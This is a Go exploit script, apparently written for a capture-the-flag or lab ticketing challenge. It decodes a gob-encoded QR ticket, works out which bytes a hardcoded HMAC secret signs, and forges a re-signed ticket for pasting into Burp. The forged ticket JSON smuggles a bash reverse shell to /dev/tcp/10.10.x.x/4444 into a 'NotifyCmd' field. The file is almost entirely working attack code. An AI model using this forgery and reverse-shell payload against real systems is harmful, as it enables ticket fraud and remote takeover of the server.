package main

import (
	"bytes"; "crypto/hmac"; "crypto/sha256"
	"encoding/base64"; "encoding/gob"; "fmt"; "net/url"
)

type VerifyTicketAuthenticity struct{ Data []byte } 

const secret = "JvoSrD6DHjWwuwHMRPhElhOtCVH6h5sWuCjPh0WKmrAWAzYClpm2A1UikQQMfiAR" //TICKET_VALIDATION_TOKEN
const origB64 = `<Origin_QR_Decode_Data`

func encodeGob(v *VerifyTicketAuthenticity) []byte {
	var buf bytes.Buffer
	var i interface{} = v
	gob.NewEncoder(&buf).Encode(&i)
	return buf.Bytes()
}

func main() {
	gob.RegisterName("*gob.VerifyTicketAuthenticity", &VerifyTicketAuthenticity{})
	raw, _ := base64.StdEncoding.DecodeString(origB64)

	// 1) Split gob and signature
	r := bytes.NewReader(raw)
	var i interface{}
	if err := gob.NewDecoder(r).Decode(&i); err != nil {
		fmt.Println("decode fail → Change Data to string:", err); return
	}
	n := len(raw) - r.Len()
	gobBytes, sig := raw[:n], raw[n:]
	orig := i.(*VerifyTicketAuthenticity)
	fmt.Printf("Original Data = %s\nsig(%d bytes)=%x\n\n", orig.Data, len(sig), sig)

	// 2) Check HMAC sign:
	signedOver := ""
	for name, in := range map[string][]byte{"gobBytes": gobBytes, "Data(JSON)": orig.Data} {
		m := hmac.New(sha256.New, []byte(secret)); m.Write(in)
		if hmac.Equal(m.Sum(nil), sig) { signedOver = name; fmt.Println(">>> HMAC sign on:", name) }
	}
	if signedOver == "" { fmt.Println("Not match — try other secret/algo (check source)"); return }

	// 3) FORGE QR Data
	evil := []byte(`{"PNR":"L32W77","Token":"bb8f30c63837f2c50e12e54f359138be","Seat":"1A","Passenger":"Bruce Wayne","NotifyCmd":"bash -c 'bash -i >& /dev/tcp/10.10.x.x/4444 0>&1'"}`)
	g := encodeGob(&VerifyTicketAuthenticity{Data: evil})
	var payload []byte
	if signedOver == "gobBytes" {
		m := hmac.New(sha256.New, []byte(secret)); m.Write(g)
		payload = append(g, m.Sum(nil)...)
	} else {
		m := hmac.New(sha256.New, []byte(secret)); m.Write(evil)
		payload = append(g, m.Sum(nil)...)
	}
	b64 := base64.StdEncoding.EncodeToString(payload)
	fmt.Println("\nqr_data (URL-encoded, paste this payload to Burp):")
	fmt.Println(url.QueryEscape(b64))
}
